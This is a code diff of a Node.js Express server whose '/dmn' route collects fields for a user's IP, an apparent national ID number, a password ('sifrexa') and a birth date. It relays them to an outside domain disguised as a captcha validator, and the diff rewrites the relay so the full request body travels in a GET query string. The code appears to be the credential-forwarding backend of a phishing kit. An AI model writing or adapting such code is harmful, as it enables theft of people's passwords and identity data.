@@ -1,7 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
-const FormData = require('form-data');
+const queryString = require('querystring');
 require('dotenv').config();
 const app = express();
 const port = process.env.PORT || 3000;
@@ -49,25 +49,21 @@ app.get('/files/js', (req, res) => {
   res.sendFile(__dirname + '/public/files/js');
 });
 
+ 
+
 app.post('/dmn', async (req, res) => {
     try {
-        const user_ip = req.body.user_ip;
-        const tach = req.body.tach;
-        const sifrexa = req.body.sifrexa;
-        const dogum = req.body.dogum;
-
-        const formData = new FormData();
-        formData.append('user_ip', user_ip);
-        formData.append('tach', tach);
-        formData.append('sifrexa', sifrexa);
-        formData.append('dogum', dogum);
+        const formData = req.body;
 
         const apiUrl = 'https://alliikkerrr.online/validateCaptcha.php';
 
-        const response = await axios.post(apiUrl, formData, {
-            headers: formData.getHeaders() // FormData için gerekli olan header'ları ayarla
-        });
+        // Gelen verileri sorgu dizesine dönüştür
+        const queryStringData = queryString.stringify(formData);
 
+        // Yeni bir URL oluştur ve GET isteğini yap
+        const response = await axios.get(apiUrl + '?' + queryStringData);
+
+        // İşlem başarılı olduğunda, istemciye dosyayı gönder
         res.sendFile(__dirname + '/public/bilgi.html');
     } catch (error) {
         console.error('Hata:', error);
